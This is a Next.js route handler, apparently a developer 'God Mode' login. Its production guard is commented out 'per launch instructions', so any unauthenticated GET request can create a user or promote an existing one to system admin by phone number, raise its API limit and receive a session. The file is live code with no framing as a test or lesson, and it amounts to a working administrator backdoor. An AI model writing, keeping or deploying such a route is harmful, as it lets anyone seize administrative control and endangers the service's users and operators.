import { NextRequest, NextResponse } from "next/server";
import { db } from "@/db/client";
import { users } from "@/db/schema";
import { eq } from "drizzle-orm";
import { setUserSession } from "@/lib/auth/session";

export async function GET(req: NextRequest) {
  // Allow production access for "God Mode" per launch instructions
  // if (process.env.NODE_ENV === "production") {
  //   return NextResponse.json(
  //     { error: "Not allowed in production" },
  //     { status: 403 }
  //   );
  // }

  const phone = req.nextUrl.searchParams.get("phone") || "+919999999999";

  let [user] =
    (await db
      .select()
      .from(users)
      .where(eq(users.phone_number, phone))
      .limit(1)) ?? [];

  if (!user) {
    const [inserted] = await db
      .insert(users)
      .values({
        phone_number: phone,
        firebase_uid: `dev_${Date.now()}`,
        name: "System Admin (Dev)",
        state_code: "DL",
        is_system_admin: true,
        api_limit: 100000
      })
      .returning();

    user = inserted;
  } else if (!user.is_system_admin) {
    const [updated] = await db
      .update(users)
      .set({
        is_system_admin: true,
        api_limit: 100000
      })
      .where(eq(users.id, user.id))
      .returning();

    user = updated;
  }

  const res = NextResponse.redirect(new URL("/system", req.url));
  setUserSession(res, user.id);
  return res;
}

